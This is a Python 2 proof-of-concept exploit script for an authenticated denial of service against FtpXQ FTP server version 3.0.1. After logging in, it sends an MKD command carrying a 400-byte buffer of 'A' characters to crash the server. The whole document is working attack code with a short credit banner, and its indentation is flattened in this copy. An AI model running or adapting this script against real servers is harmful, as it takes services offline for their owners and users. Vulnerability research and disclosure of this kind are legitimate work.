#!/usr/bin/python

banner=(
"*************************\r\n"
"* Exploit Title: FtpXQ authenticated remote Dos "
"* (trial on http://www.datawizard.net/Products/FtpXQ/Setup.EXE) Version 3.0.1 \r\n"
"* Tested on XP sp2 english"
"* Needs write access --> vuln on MKD command\r\n"
"* Vulnerability found by Marc Doudiet\r\n"
"* For educational purpose only\r\n"
"* Proof of concept code\r\n")


import socket
import sys

def Usage():
print ("Usage: ./ftpxq.py <Username> <password> <host>\n")

string="A"*400

def start(username, password, hostname):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print banner
try:
s.connect((hostname, 21))
print "[-] Connecting to the FTP ..."
except:
print ("[-] Connection error!")
sys.exit(1)
s.recv(1024)
s.send('USER '+username+'\r\n')
s.recv(1024)
s.send('PASS '+password+'\r\n')
s.recv(1024)
print "[-] Sending evil buffer ...\r\n"
s.send('MKD '+string+'\r\n')

if len(sys.argv) <> 4:
Usage()
sys.exit(1)
else:
hostname=sys.argv[1]
username=sys.argv[2]
passwd=sys.argv[3]
start(hostname,username,passwd)
print "[-] Exploit seems to work"
sys.exit(0)